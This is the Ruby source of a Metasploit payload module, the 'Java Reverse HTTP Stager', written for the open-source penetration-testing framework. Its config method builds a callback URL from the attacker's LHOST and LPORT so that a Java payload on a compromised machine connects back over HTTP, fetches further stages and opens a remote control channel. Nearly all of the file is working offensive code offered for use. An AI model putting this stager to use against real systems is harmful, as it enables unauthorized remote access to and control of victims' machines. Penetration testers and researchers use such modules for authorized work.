##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'

module MetasploitModule

  CachedSize = 5123

  include Msf::Payload::Stager
  include Msf::Payload::Java

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => [
          'mihi',  # all the hard work
          'egypt', # msf integration
          'hdm',   # windows/reverse_http
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Convention'    => 'javaurl',
      'Stager'        => {'Payload' => ""}
      ))

    register_advanced_options(
      [
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [ ]
  end

  def config
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))

    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    spawn = datastore["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    c << "URL=http://#{datastore["LHOST"]}"
    c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    c << "#{luri}"
    c << generate_uri_uuid_mode(:init_java, uri_req_len)
    c << "\n"

    c
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
